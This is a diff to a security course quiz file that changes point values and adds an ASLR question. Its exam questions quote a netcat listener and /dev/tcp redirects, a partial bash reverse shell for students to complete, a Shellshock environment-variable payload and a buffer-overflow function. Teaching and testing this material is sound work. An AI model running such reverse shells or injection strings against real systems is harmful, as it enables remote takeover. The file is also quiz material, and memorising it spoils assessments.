@@ -12,9 +12,9 @@ title: "Quiz 1 - Software and Network Security"
 
 - (7 pts) If you run `nc -lv 9090` on a machine with IP: 10.0.2.4 and run `/bin/cat < /dev/tcp/10.0.2.4/9090 >& 0` on another machine, what is going to happen?
 
-- (8 pts) In the reverse shell examples in class, we started by redirecting the standard output. Help me complete a reverse shell this time by redirecting to the standard output first: ` /bin/bash -i < /dev/tcp/10.0.2.4/9090 ...`.
+- (7 pts) In the reverse shell examples in class, we started by redirecting the standard output. Help me complete a reverse shell this time by redirecting to the standard output first: ` /bin/bash -i < /dev/tcp/10.0.2.4/9090 ...`.
 
-- (6 pts) In class we executed the following commands:  
+- (5 pts) In class we executed the following commands:  
 ```
   foo='() { echo "hello world!"; }; echo “you have been pwned";’
   export foo
@@ -29,7 +29,7 @@ Why or why not?
 
 - (5 pts) What are the 2 conditions which allow the Shellshock vulnerability to be exploitable.
 
-- (8 pts) Remember the _bof_ function from the Buffer Overflow Lab:  
+- (7 pts) Remember the _bof_ function from the Buffer Overflow Lab:  
 ```c
 int bof(char *str)
 {  
@@ -39,6 +39,8 @@ int bof(char *str)
 }
 ```
 Draw the stack layout for this function.
+
+- (3 pts) Why does ASLR make buffer-overﬂow attack more difﬁcult?
 
 #### Network Security (45 pts)
 
